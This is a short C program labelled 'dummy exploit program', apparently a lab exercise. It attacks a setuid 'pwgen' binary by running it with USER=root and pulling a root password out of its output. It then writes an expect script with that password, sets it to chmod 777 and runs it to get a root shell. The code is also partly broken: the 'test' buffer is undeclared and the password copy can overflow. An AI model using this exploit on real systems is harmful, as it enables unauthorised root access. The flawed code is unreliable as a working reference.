/*
* dummy exploit program
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include </usr/local/src/shellcode.h>



#define TARGET "/usr/local/bin/pwgen"


int main(int argc, char *argv[])
{

  int i;
  FILE *targetprocess, *supro,*shellscript;
  char passwdln[50];
  char passwd[10];
  char bashscript[200] = "#!/usr/bin/expect -f\n spawn su root\n expect \"Password:\"\n send -- \"%s\r\" \n interact";





  targetprocess = popen("USER=root /usr/local/bin/pwgen -w","r");
  fgets(passwdln ,50 , targetprocess);
  i =0;
  while ((31+i) < strlen(passwdln)){//assuming password will always be 6 char
    passwd[i] = passwdln[31+i]; //get password
    i++;

  }
  passwd[6] = '\0';
  pclose(targetprocess);
  shellscript = fopen("tmpcode.sh","w+");
  sprintf(test, bashscript,passwd);
  fputs(test,shellscript);
  fclose(shellscript);
  system("chmod 777 tmpcode.sh");
  system("./tmpcode.sh");

  //su to root


  exit(0);
}
